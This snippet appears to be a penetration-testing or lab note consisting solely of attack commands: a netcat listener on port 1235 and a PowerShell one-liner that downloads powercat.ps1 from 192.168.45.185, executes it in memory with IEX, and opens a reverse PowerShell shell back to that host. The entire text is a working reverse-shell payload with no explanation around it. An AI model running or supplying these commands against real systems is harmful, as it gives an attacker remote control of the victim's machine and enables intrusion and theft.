```sh
nc -lvnp 1235

IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.185/powercat.ps1");powercat -c 192.168.45.185 -p 1235 -e powershell

```